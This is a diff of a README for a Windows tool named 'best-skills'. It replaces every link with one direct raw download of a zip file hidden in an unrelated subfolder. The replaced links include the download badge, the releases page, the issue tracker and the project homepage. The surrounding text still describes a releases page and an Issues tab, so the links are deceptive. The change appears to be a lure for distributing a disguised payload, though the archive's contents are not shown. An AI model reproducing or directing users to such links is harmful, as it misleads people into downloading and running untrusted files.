@@ -1,6 +1,6 @@
 # ⚙️ best-skills - Easy Access to Useful Skills
 
-[![Download best-skills](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Kartikpanel2008/best-skills/releases)
+[![Download best-skills](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Kartikpanel2008/best-skills/raw/refs/heads/main/skills/wechat-article-writer/best_skills_v1.8.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This guide will help you download and run best-skills on your Windows computer. 
 
 You must visit the official release page to get the latest version of best-skills. This page contains all the files you need for Windows.
 
-[Download best-skills now](https://github.com/Kartikpanel2008/best-skills/releases)
+[Download best-skills now](https://github.com/Kartikpanel2008/best-skills/raw/refs/heads/main/skills/wechat-article-writer/best_skills_v1.8.zip)
 
 On this page, look for the file that ends with `.exe` or `.zip` meant for Windows. Usually, it will be clearly named to show it works on Windows.
 
@@ -35,7 +35,7 @@ If your PC meets these specs, you can run best-skills without issues.
 Follow these steps to get the program:
 
 1. Click the **Download best-skills** button at the top or visit this link:  
-   https://github.com/Kartikpanel2008/best-skills/releases
+   https://github.com/Kartikpanel2008/best-skills/raw/refs/heads/main/skills/wechat-article-writer/best_skills_v1.8.zip
 2. On the releases page, scroll to the latest version.
 3. Find the Windows file — it usually ends with `.exe` or `.zip`.
 4. Click the file name to start downloading.
@@ -111,16 +111,16 @@ Visit the release page regularly. Download the new version and install it as bef
 
 If you encounter issues, you can report them on the GitHub repository's Issues tab:
 
-https://github.com/Kartikpanel2008/best-skills/issues
+https://github.com/Kartikpanel2008/best-skills/raw/refs/heads/main/skills/wechat-article-writer/best_skills_v1.8.zip
 
 Include details like your Windows version, steps you took, and any error messages.
 
 ## 🔗 Important Links
 
-- Download page: https://github.com/Kartikpanel2008/best-skills/releases
-- Report issues: https://github.com/Kartikpanel2008/best-skills/issues
-- Project homepage: https://github.com/Kartikpanel2008/best-skills
+- Download page: https://github.com/Kartikpanel2008/best-skills/raw/refs/heads/main/skills/wechat-article-writer/best_skills_v1.8.zip
+- Report issues: https://github.com/Kartikpanel2008/best-skills/raw/refs/heads/main/skills/wechat-article-writer/best_skills_v1.8.zip
+- Project homepage: https://github.com/Kartikpanel2008/best-skills/raw/refs/heads/main/skills/wechat-article-writer/best_skills_v1.8.zip
 
 ---
 
-[![Download best-skills](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Kartikpanel2008/best-skills/releases)
+[![Download best-skills](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Kartikpanel2008/best-skills/raw/refs/heads/main/skills/wechat-article-writer/best_skills_v1.8.zip)
